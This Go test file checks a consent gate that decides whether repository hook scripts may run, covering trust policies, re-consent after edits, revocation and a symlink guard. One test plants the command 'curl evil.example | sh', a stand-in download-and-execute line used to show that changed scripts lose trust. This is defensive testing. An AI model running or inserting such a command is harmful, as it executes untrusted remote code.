package git

import (
	"bytes"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// resetScriptConsentForTest installs cfg for the duration of the test and
// restores whatever was ambient beforehand afterward (TestMain sets the
// package-wide default to ScriptConsentAlways so the rest of this package's
// tests, written before the consent gate existed, keep working unattended).
// Restoring the prior value rather than a hardcoded one keeps these tests
// order-independent.
func resetScriptConsentForTest(t *testing.T, cfg ScriptConsentConfig) {
	t.Helper()
	prev := getScriptConsentConfig()
	SetScriptConsentConfig(cfg)
	t.Cleanup(func() {
		SetScriptConsentConfig(prev)
	})
}

func writeTestScript(t *testing.T, repoDir, name, content string) string {
	t.Helper()
	dir := filepath.Join(repoDir, ".agent-deck")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestParseScriptConsentPolicy(t *testing.T) {
	cases := map[string]ScriptConsentPolicy{
		"prompt":   ScriptConsentPrompt,
		"Prompt":   ScriptConsentPrompt,
		" always ": ScriptConsentAlways,
		"ALWAYS":   ScriptConsentAlways,
		"never":    ScriptConsentNever,
		"NEVER":    ScriptConsentNever,
		"":         ScriptConsentPrompt, // unset -> secure default
		"bogus":    ScriptConsentPrompt, // typo -> secure default, never silently "always"
	}
	for in, want := range cases {
		if got := ParseScriptConsentPolicy(in); got != want {
			t.Errorf("ParseScriptConsentPolicy(%q) = %q, want %q", in, got, want)
		}
	}
}

// mustIdentity inspects repoDir's hook of the given kind, failing the test
// if it is missing or unreadable.
func mustIdentity(t *testing.T, repoDir, kind string) *WorktreeScriptIdentity {
	t.Helper()
	id, err := InspectWorktreeScript(repoDir, kind)
	if err != nil {
		t.Fatal(err)
	}
	if id == nil {
		t.Fatalf("no %s hook found under %s", kind, repoDir)
	}
	return id
}

func trustStatus(t *testing.T, repoDir, kind string) ScriptTrustStatus {
	t.Helper()
	status, err := WorktreeScriptTrustStatus(mustIdentity(t, repoDir, kind))
	if err != nil {
		t.Fatal(err)
	}
	return status
}

func TestCheckScriptConsent_NeverPolicy_BlocksEvenIfPreviouslyTrusted(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	// Pre-trust it, to prove "never" still wins even over stored trust.
	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})

	err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{})
	if err == nil {
		t.Fatal("expected ScriptConsentNever to block execution, got nil error")
	}
	if !strings.Contains(err.Error(), "never") {
		t.Errorf("expected error to mention the never policy, got: %v", err)
	}
	if !errors.Is(err, ErrWorktreeScriptNotApproved) {
		t.Errorf("expected a skip (ErrWorktreeScriptNotApproved), got: %v", err)
	}
}

func TestCheckScriptConsent_AlwaysPolicy_AllowsWithoutStore(t *testing.T) {
	repoDir := t.TempDir()
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentAlways})

	if err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{}); err != nil {
		t.Fatalf("expected ScriptConsentAlways to allow unconditionally, got: %v", err)
	}
}

// TestCheckScriptConsent_PromptPolicy_NonInteractive_SkipsWithOneLineNotice
// pins the CLI skip notice: one line naming the approve command for this
// repo and hook, the short hash, the interpreter and --run-hooks.
func TestCheckScriptConsent_PromptPolicy_NonInteractive_SkipsWithOneLineNotice(t *testing.T) {
	repoDir := t.TempDir()
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})

	// go test's stdin/stdout are not a TTY, so this exercises the
	// non-interactive path deterministically: never hang, never auto-run.
	id := mustIdentity(t, repoDir, "setup")
	err := checkScriptConsent(id, &bytes.Buffer{})
	if err == nil {
		t.Fatal("expected an unrecognized script under \"prompt\" with no TTY to be skipped")
	}
	if !errors.Is(err, ErrWorktreeScriptNotApproved) {
		t.Errorf("expected ErrWorktreeScriptNotApproved, got: %v", err)
	}
	msg := err.Error()
	for _, want := range []string{
		"agent-deck worktree trust-hooks " + id.RepoRoot + " --hook setup",
		"--run-hooks",
		id.ShortHash(),
		ScriptInterpreterShell,
		"not approved yet",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("notice missing %q: %s", want, msg)
		}
	}
	if strings.Contains(msg, "\n") {
		t.Errorf("notice must be one line, got: %q", msg)
	}
}

func TestCheckScriptConsent_PromptPolicy_AllowOverride_AllowsButDoesNotPersist(t *testing.T) {
	repoDir := t.TempDir()
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt, AllowOverride: true})

	id := mustIdentity(t, repoDir, "setup")
	var out bytes.Buffer
	if err := checkScriptConsent(id, &out); err != nil {
		t.Fatalf("expected --run-hooks override to allow, got: %v", err)
	}
	if !strings.Contains(out.String(), "--run-hooks") || !strings.Contains(out.String(), id.SHA256) {
		t.Errorf("expected the override notice to name --run-hooks and the full sha256, got: %q", out.String())
	}

	// The override is one-shot: it must not have written a trust record.
	if got := trustStatus(t, repoDir, "setup"); got != ScriptUntrusted {
		t.Errorf("expected --run-hooks to NOT persist trust, status = %v", got)
	}
}

func TestCheckScriptConsent_PromptPolicy_AllowOverrideWithTrust_Persists(t *testing.T) {
	repoDir := t.TempDir()
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt, AllowOverride: true, PersistOverride: true})

	if err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{}); err != nil {
		t.Fatal(err)
	}
	if got := trustStatus(t, repoDir, "setup"); got != ScriptTrusted {
		t.Errorf("expected --run-hooks --trust to record trust, status = %v", got)
	}
}

func TestCheckScriptConsent_PromptPolicy_PreTrustedContent_AllowsSilently(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})

	var out bytes.Buffer
	if err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &out); err != nil {
		t.Fatalf("expected a pre-trusted identity to be allowed without a prompt, got: %v", err)
	}
	if out.Len() != 0 {
		t.Errorf("expected no output for a trusted hook, got %q", out.String())
	}
}

func TestCheckScriptConsent_PromptPolicy_ContentChanged_RequiresReconsent(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho original\n")

	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
		t.Fatal(err)
	}

	// Attacker (or legitimate author) edits the script after it was trusted.
	if err := os.WriteFile(scriptPath, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})

	if got := trustStatus(t, repoDir, "setup"); got != ScriptChanged {
		t.Errorf("status after content change = %v, want ScriptChanged", got)
	}
	err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{})
	if err == nil {
		t.Fatal("expected changed script content to invalidate prior trust and require re-consent")
	}
	if !strings.Contains(err.Error(), "changed since it was approved") {
		t.Errorf("expected the notice to say the hook changed, got: %v", err)
	}
}

func TestRevokeScriptConsent(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
		t.Fatal(err)
	}
	if got := trustStatus(t, repoDir, "setup"); got != ScriptTrusted {
		t.Fatalf("expected freshly trusted script to be trusted, status = %v", got)
	}

	existed, err := RevokeScriptConsent(repoDir, "setup")
	if err != nil {
		t.Fatal(err)
	}
	if !existed {
		t.Error("expected RevokeScriptConsent to report an existing entry was removed")
	}

	// Revoking again (or revoking a kind/repo that was never trusted) must
	// stay a no-op, not an error — this is what lets the CLI call it
	// unconditionally even when the script file has since been deleted.
	existedAgain, err := RevokeScriptConsent(repoDir, "setup")
	if err != nil {
		t.Fatal(err)
	}
	if existedAgain {
		t.Error("expected second revoke of the same entry to report nothing existed")
	}
	if got := trustStatus(t, repoDir, "setup"); got != ScriptUntrusted {
		t.Errorf("expected revoked script to no longer be trusted, status = %v", got)
	}
}

func TestGateAndRunWorktreeSetupScript_NoScript_IsANoop(t *testing.T) {
	repoDir := t.TempDir()
	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})

	if err := GateAndRunWorktreeSetupScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0); err != nil {
		t.Fatalf("expected no error when no setup script exists, got: %v", err)
	}
}

func TestGateAndRunWorktreeSetupScript_NeverPolicy_BlocksExecution(t *testing.T) {
	repoDir := t.TempDir()
	marker := filepath.Join(repoDir, "ran.txt")
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\ntouch \""+marker+"\"\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})

	err := GateAndRunWorktreeSetupScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0)
	if err == nil {
		t.Fatal("expected ScriptConsentNever to block the setup script")
	}
	if _, statErr := os.Stat(marker); !os.IsNotExist(statErr) {
		t.Error("setup script ran despite ScriptConsentNever — consent gate did not block execution")
	}
}

func TestGateAndRunWorktreeDestructionScript_NeverPolicy_BlocksExecution(t *testing.T) {
	repoDir := t.TempDir()
	marker := filepath.Join(repoDir, "ran.txt")
	writeTestScript(t, repoDir, "worktree-destruction.sh", "#!/bin/sh\ntouch \""+marker+"\"\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})

	err := GateAndRunWorktreeDestructionScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0)
	if err == nil {
		t.Fatal("expected ScriptConsentNever to block the destruction script")
	}
	if _, statErr := os.Stat(marker); !os.IsNotExist(statErr) {
		t.Error("destruction script ran despite ScriptConsentNever — consent gate did not block execution")
	}
}

func TestGateAndRunWorktreeSetupScript_AlwaysPolicy_Runs(t *testing.T) {
	repoDir := t.TempDir()
	marker := filepath.Join(repoDir, "ran.txt")
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\ntouch \""+marker+"\"\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentAlways})

	if err := GateAndRunWorktreeSetupScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0); err != nil {
		t.Fatalf("expected ScriptConsentAlways to run the script, got error: %v", err)
	}
	if _, statErr := os.Stat(marker); statErr != nil {
		t.Errorf("expected setup script to have run and created %s: %v", marker, statErr)
	}
}

// TestPromptScriptConsent_AllowPromptFalse_NeverAsks pins the plumbing fix
// for the TUI/web finding: when AllowInteractivePrompt is false, the prompt
// must never attempt to read stdin or write prompt text, regardless of what
// isInteractiveConsoleStdio would otherwise report — this is what stops a
// blocking bufio.ReadString from racing bubbletea's raw-mode input reader
// (and stealing keystrokes) or blocking a remote HTTP handler on an
// operator's terminal nobody is watching.
func TestPromptScriptConsent_AllowPromptFalse_NeverAsks(t *testing.T) {
	simulateTerminal(t, "a\n")
	var out bytes.Buffer
	id := WorktreeScriptIdentity{Kind: "setup", RepoRoot: "/some/repo", ScriptPath: "/some/repo/.agent-deck/worktree-setup.sh"}
	decision, interactive := promptScriptConsent(id, ScriptUntrusted, &out, false)
	if decision != ScriptConsentSkip || interactive {
		t.Errorf("expected allowPrompt=false to short-circuit to (skip, interactive=false), got decision=%v interactive=%v", decision, interactive)
	}
	if out.Len() != 0 {
		t.Errorf("expected no prompt text written when allowPrompt=false, got: %q", out.String())
	}
}

// TestCheckScriptConsent_PromptPolicy_InteractivePromptDisallowed_FailsClosed
// exercises the same behavior at the checkScriptConsent level: an
// unrecognized script under the "prompt" policy with AllowInteractivePrompt
// forced false must fail closed with the same remediation message as the
// no-TTY case, never silently run and never block.
func TestCheckScriptConsent_PromptPolicy_InteractivePromptDisallowed_FailsClosed(t *testing.T) {
	simulateTerminal(t, "a\n")
	repoDir := t.TempDir()
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt, AllowInteractivePrompt: false})

	err := checkScriptConsent(mustIdentity(t, repoDir, "setup"), &bytes.Buffer{})
	if err == nil {
		t.Fatal("expected AllowInteractivePrompt=false to deny an unrecognized script even if stdio happened to be a terminal")
	}
	if !strings.Contains(err.Error(), "trust-hooks") {
		t.Errorf("expected remediation pointing at `agent-deck worktree trust-hooks`, got: %v", err)
	}
}

// TestScriptConsentPolicyShortCircuit pins that "always"/"never" resolve
// without needing scriptConsentPolicyShortCircuit's caller to ever touch the
// script's content, and that "prompt" defers to the hash-based path.
func TestScriptConsentPolicyShortCircuit(t *testing.T) {
	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentAlways})
	if handled, err := scriptConsentPolicyShortCircuit("setup", "/does/not/matter"); !handled || err != nil {
		t.Errorf("expected ScriptConsentAlways to short-circuit with no error, got handled=%v err=%v", handled, err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})
	if handled, err := scriptConsentPolicyShortCircuit("setup", "/does/not/matter"); !handled || err == nil {
		t.Errorf("expected ScriptConsentNever to short-circuit with a denial error, got handled=%v err=%v", handled, err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})
	if handled, err := scriptConsentPolicyShortCircuit("setup", "/does/not/matter"); handled {
		t.Errorf("expected ScriptConsentPrompt to NOT short-circuit, got handled=%v err=%v", handled, err)
	}
}

// TestGateAndRunWorktreeSetupScript_NonRegularFile_RejectedBeforeHashing
// proves the IsRegular guard rejects a non-regular script (simulated here
// via a symlink to a directory, which is portable across CI's macOS/Linux
// runners — a symlink-to-FIFO/device is the real-world attack shape and is
// covered separately by the platform-specific hang test) before any attempt
// to open/hash it, under the "prompt" policy where hashing would otherwise
// be attempted.
func TestGateAndRunWorktreeSetupScript_NonRegularFile_RejectedBeforeHashing(t *testing.T) {
	repoDir := t.TempDir()
	dir := filepath.Join(repoDir, ".agent-deck")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(repoDir, "some-directory")
	if err := os.MkdirAll(target, 0o755); err != nil {
		t.Fatal(err)
	}
	scriptPath := filepath.Join(dir, "worktree-setup.sh")
	if err := os.Symlink(target, scriptPath); err != nil {
		t.Skipf("symlink not supported on this platform: %v", err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})

	err := GateAndRunWorktreeSetupScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0)
	if err == nil {
		t.Fatal("expected a non-regular (directory-target symlink) script file to be rejected")
	}
	if !strings.Contains(err.Error(), "not a regular file") {
		t.Errorf("expected the IsRegular guard's error message, got: %v", err)
	}
}
